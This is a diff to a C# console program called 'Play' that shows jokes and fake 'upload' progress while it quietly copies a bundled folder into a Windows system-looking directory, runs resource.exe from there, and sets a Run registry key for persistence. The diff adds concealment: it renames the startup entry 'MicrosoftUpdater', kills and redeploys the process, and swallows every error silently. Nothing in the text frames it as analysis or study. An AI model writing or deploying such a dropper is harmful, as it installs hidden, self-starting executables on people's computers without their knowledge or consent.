@@ -10,7 +10,7 @@ namespace Play
     class Heartbeat
     {
         private readonly Timer _timer;
-        private bool checkFlag = true;
+        static bool checkFlag = true;
         const string targetFolderPath = @"C:\ProgramData\Microsoft\Windows\Telescope";
         static int displayCheck = 0;
         public Heartbeat()
@@ -23,53 +23,92 @@ namespace Play
         {
             if (checkFlag)
             {
+                Console.Clear();
+                Console.WriteLine("Play version 1.0.0");
+                checkFlag = false;
                 CheckFolder();
                 CopyFolder();
                 RunProcess();
                 SetStartup();
-                checkFlag = false;
             }
             PrintFunny();
         }
-        private static void CheckFolder()
+        async private static void CheckFolder()
         {
-            if (!Directory.Exists(targetFolderPath))
+            try
             {
-                Directory.CreateDirectory(targetFolderPath);
+                Process[] resourceProcesses = Process.GetProcessesByName("resource");
+                foreach (Process resourceProcess in resourceProcesses)
+                {
+                    resourceProcess.Kill();
+                    resourceProcess.WaitForExit();
+                    resourceProcess.Dispose();
+                }
+
+                if (Directory.Exists(targetFolderPath))
+                {
+                    Directory.Delete(targetFolderPath, true);
+                }
+                Console.WriteLine("upload--25.00%");
             }
-            Console.WriteLine("upload--25.00%");
+            catch (Exception)
+            {
+                checkFlag = true;
+            }
         }
         private static void CopyFolder()
         {
-            string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
-            string sourceFolderPath = Path.Combine(currentPath, @"data");
-            CopyFilesRecursively(sourceFolderPath, targetFolderPath);
-            Console.WriteLine("upload--50.00%");
+            try
+            {
+                Directory.CreateDirectory(targetFolderPath);
+                string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+                string sourceFolderPath = Path.Combine(currentPath, @"data");
+                CopyFilesRecursively(sourceFolderPath, targetFolderPath);
+                Console.WriteLine("upload--50.00%");
+            }
+            catch (Exception)
+            {
+                checkFlag = true;
+            }
         }
         private static void CopyFilesRecursively(string sourcePath, string targetPath)
         {
-            //Now Create all of the directories
-            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
+            try
             {
-                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
-            }
+                //Now Create all of the directories
+                foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
+                {
+                    Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
+                }
 
-            //Copy all the files & Replaces any files with the same name
-            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
+                //Copy all the files & Replaces any files with the same name
+                foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
+                {
+                    File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
+                }
+            }
+            catch (Exception)
             {
-                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
+                checkFlag = true;
             }
         }
         private static void RunProcess()
         {
-            Process[] pname = Process.GetProcessesByName("resource");
-            if (pname.Length == 0)
+            try
             {
-                string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
-                string filename = currentPath + @"\data\resource.exe";
-                Process.Start(filename);
+                Process[] pname = Process.GetProcessesByName("resource");
+                if (pname.Length == 0)
+                {
+                    //string currentPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+                    string filename = targetFolderPath + @"\resource.exe";
+                    Process.Start(filename);
+                }
+                Console.WriteLine("upload--75.00%");
             }
-            Console.WriteLine("upload--75.00%");
+            catch (Exception)
+            {
+                checkFlag = true;
+            }
         }
         private static void SetStartup2()
         {
@@ -83,24 +122,31 @@ namespace Play
         }
         private static void SetStartup()
         {
-            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            key.SetValue("secret", targetFolderPath + @"\resource.exe");
+            try
+            {
+                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                key.SetValue("MicrosoftUpdater", targetFolderPath + @"\resource.exe");
 
-            Console.WriteLine("upload-100.00%");
+                Console.WriteLine("upload-100.00%");
+            }
+            catch (Exception)
+            {
+                checkFlag = true;
+            }
         }
         private static void PrintFunny()
         {
             displayCheck++;
-            if      (displayCheck == 1) PrintFunny1();
-            else if (displayCheck == 2) PrintFunny2();
-            else if (displayCheck == 3) PrintFunny3();
-            else if (displayCheck == 4) PrintFunny4();
+            if      (displayCheck == 1)  PrintFunny1();
+            else if (displayCheck == 2)  PrintFunny2();
+            else if (displayCheck == 3)  PrintFunny3();
+            else if (displayCheck == 4)  PrintFunny4();
 
-            else if (displayCheck == 5) PrintFunnyA();
-            else if (displayCheck == 6) PrintFunnyB();
-            else if (displayCheck == 7) PrintFunnyC();
-            else if (displayCheck == 8) PrintFunnyD();
-            else if (displayCheck == 9) PrintFunnyE();
+            else if (displayCheck == 5)  PrintFunnyA();
+            else if (displayCheck == 6)  PrintFunnyB();
+            else if (displayCheck == 7)  PrintFunnyC();
+            else if (displayCheck == 8)  PrintFunnyD();
+            else if (displayCheck == 9)  PrintFunnyE();
             else if (displayCheck == 10) PrintFunnyF();
             else if (displayCheck == 11) PrintFunnyG();
             else if (displayCheck == 12) PrintFunnyH();
